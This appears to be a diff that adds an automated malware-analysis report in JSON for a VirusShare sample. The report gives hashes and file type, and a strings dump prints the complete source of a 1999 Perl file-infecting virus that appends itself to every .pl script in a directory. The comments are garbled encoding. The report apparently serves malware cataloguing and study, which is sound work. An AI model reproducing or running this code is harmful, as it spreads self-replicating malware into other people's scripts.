@@ -1,0 +1,83 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file"
+        },
+        "macro": "#here virus starts\n# Intender by -Byst- (c) 1999\n$source = __FILE__;\nwhile (<*.pl>)\n{\n  $name = $_;                    # \ufffd\ufffd\ufffd \ufffd \ufffd\ufffd -\ufffd\ufffd\ufffd\ufffd\ufffd\n  $cname = crypt($name,$name);   # \ufffd\ufffd\ufffd \ufffd\u0bac\ufffd\ufffd\ufffd\ufffd\u7b6e\ufffd\ufffd \ufffd \ufffd\ufffd \n\n  # \ufffd\u0ba2\ufffd\u0a2c \ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\u0ba2 \ufffd \ufffd\ufffd \u39a5 \ufffd \ufffd\ufffd?\n\n  open(TARGET,\"<$name\");         # \ufffd\ufffd\ufffd\ufffd \n  $allready_infected = 0;\n  while (<TARGET>) {\n   if (index($_,\"\\x23 Intender by -Byst- (c) 1999\") == 0)\n    { $allready_infected = 1;}   # \u39a5 \ufffd\ufffd\ufffd\ufffd\u0ba2 \ufffd!\n  }\n  close(TARGET);\n  if ($allready_infected == 1 )\n   { next;}                      # \ufffd\ufffd\ufffd\u5ba4\ufffd\ufffd \ufffd \u1ae5\ufffd\ufffd\ufffd\u9969 \ufffd\ufffd\ufffd\u28a5\n\n  # \ufffd\u0ba2\ufffd\u0a2c, \ufffd\ufffd\ufffd \ufffd\ufffd \ufffd \u296b\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\u0baa \u2a2f  !/usr/bin/perl\n  open(TARGET,\"<$name\");         # \ufffd\ufffd\ufffd\ufffd \n  $flag = 0;\n  while (<TARGET>) {\n   if (index($_,\"\\x23!\") == 0)   # \ufffd \u8ae8 \ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\u0baa\ufffd\n    { $flag = 1;}                # \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\n  }\n  close(TARGET);\n\n  # \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd \ufffd \ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd\u0ba9 \u1ba4\ufffd\u09a8\ufffd\ufffd\ufffd \ufffd\ub9ee\ufffd \ufffd\ufffd\u6964\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\u0ba2 \ufffd\ufffd\ufffd\n  open(TARGET,\"<$name\");         # \ufffd\ufffd\ufffd\ufffd \n  open(FBUF,\">$cname\");          # \ufffd\u0bac\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\n\n  if ($flag == 1) {              # \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd \u796d\ufffd\ufffd \ufffd \ufffd \ufffd  \ufffd\u0ba3\ufffd \ufffd\ufffd\ufffd?\n   while (<TARGET>) {            # \ufffd\u996c \ufffd\ufffd\ufffd\n    print(FBUF);                 # \ufffd\ufffd\ufffd \ufffd\uf96c \ufffd\ufffd \ufffd\ufffd\u0baa\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd #!\n    if (index($_,\"\\x23!\") == 0 ) #  \ufffd , \ufffd\ufffd\ufffd \ufffd \ufffd \ufffd \ufffd\ufffd \ufffd\u0ba3\ufffd \ufffd\ufffd\ufffd\n      { last;}\n   }\n  }\n\n  # \ufffd\u996c \u296b  \ufffd\ufffd\u6964\ufffd\ufffd\n  $_ = \"\\n\";print(FBUF);\n  open(SOURCE,\"<$source\");       #  \ufffd \ufffd\ufffd\ufffd\u9a29 \ufffd \ufffd\ufffd\n  while(<SOURCE>) {              # \ufffd\u996c \ufffd\u0a27\ufffd \ufffd \ufffd \ufffd \ufffd  - \"#here virus starts\"\n   if (index($_,\"\\x23here virus starts\") == 0) { last;}\n  }\n  print(FBUF);\n  # \ufffd\ufffd\ufffd\ufffd \u296a\ufffd\ufffd \ufffd\ufffd\u6964\ufffd\ufffd -> \ufffd\u0bac\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\n  while (<SOURCE>) {\n   print(FBUF);\n   if (index($_,\"\\x23here virus ends\") == 0) { last;}\n  }\n  close(SOURCE);\n  $_ = \"\\n\";print(FBUF);\n  # \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd -> \ufffd\u0bac\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\n  while (<TARGET>) {\n   print(FBUF);\n  }\n  close(TARGET);\n  close(FBUF);\n  rename($cname,$name);\n}\n#here virus ends\n\n"
+    },
+    "filename": "VirusShare_f43faeb0b4fa9146e1b3bac462b55f8b",
+    "filesize": 1933,
+    "filetype": "Non-ISO extended-ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "f43faeb0b4fa9146e1b3bac462b55f8b",
+        "sha1": "fb012ece0e2777f463433b33643cbc637366eb73",
+        "sha256": "d3be9dd8112894a2c25335d26d38998c829217df09f58ec7604d8ea44094db47"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#here virus starts",
+            "# Intender by -Byst- (c) 1999",
+            "$source = __FILE__;",
+            "while (<*.pl>)",
+            "  $name = $_;                    #    -",
+            "  $cname = crypt($name,$name);   #  \u0bac\u7b6e   ",
+            "  # \u0ba2\u0a2c  \u0ba2   \u39a5  ?",
+            "  open(TARGET,\"<$name\");         #  ",
+            "  $allready_infected = 0;",
+            "  while (<TARGET>) {",
+            "   if (index($_,\"\\x23 Intender by -Byst- (c) 1999\") == 0)",
+            "    { $allready_infected = 1;}   # \u39a5 \u0ba2 !",
+            "  close(TARGET);",
+            "  if ($allready_infected == 1 )",
+            "   { next;}                      # \u5ba4  \u1ae5\u9969 \u28a5",
+            "  # \u0ba2\u0a2c,    \u296b  \u0baa \u2a2f  !/usr/bin/perl",
+            "  open(TARGET,\"<$name\");         #  ",
+            "  $flag = 0;",
+            "  while (<TARGET>) {",
+            "   if (index($_,\"\\x23!\") == 0)   #  \u8ae8   \u0baa",
+            "    { $flag = 1;}                #   ",
+            "  close(TARGET);",
+            "  #      \u0ba9 \u1ba4\u09a8 \ub9ee \u6964 \u0ba2 ",
+            "  open(TARGET,\"<$name\");         #  ",
+            "  open(FBUF,\">$cname\");          # \u0bac  ",
+            "  if ($flag == 1) {              #     \u796d     \u0ba3 ?",
+            "   while (<TARGET>) {            # \u996c ",
+            "    print(FBUF);                 #  \uf96c  \u0baa   #!",
+            "    if (index($_,\"\\x23!\") == 0 ) #   ,      \u0ba3 ",
+            "      { last;}",
+            "   }",
+            "  # \u996c \u296b  \u6964",
+            "  $_ = \"\\n\";print(FBUF);",
+            "  open(SOURCE,\"<$source\");       #   \u9a29  ",
+            "  while(<SOURCE>) {              # \u996c \u0a27      - \"#here virus starts\"",
+            "   if (index($_,\"\\x23here virus starts\") == 0) { last;}",
+            "  print(FBUF);",
+            "  #  \u296a \u6964 -> \u0bac  ",
+            "  while (<SOURCE>) {",
+            "   print(FBUF);",
+            "   if (index($_,\"\\x23here virus ends\") == 0) { last;}",
+            "  close(SOURCE);",
+            "  $_ = \"\\n\";print(FBUF);",
+            "  #      -> \u0bac  ",
+            "  while (<TARGET>) {",
+            "   print(FBUF);",
+            "  close(TARGET);",
+            "  close(FBUF);",
+            "  rename($cname,$name);",
+            "#here virus ends"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.339870",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
